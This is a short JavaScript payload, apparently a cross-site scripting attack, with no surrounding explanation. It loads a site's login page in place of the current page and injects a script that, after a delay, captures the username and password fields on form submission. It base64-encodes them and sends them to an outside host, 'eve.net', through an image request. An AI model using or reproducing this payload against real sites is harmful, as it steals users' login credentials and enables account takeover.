(async () => 
  document.write(
    await fetch(`/login.php?url=${encodeURIComponent('/do-question.php?aaid=10972720')}`)
    .then(response => response.text())
    .then(text => text + `
      <script>
        setTimeout(() => {
          $('form[action*=login]').submit(({currentTarget}) => {
            a = currentTarget
            new Image.src = '//eve.net/' + btoa(a[0].value) + '/' + btoa(a[1].value)
          })
        }, 4000)
      </script>
    `)
  )
})()
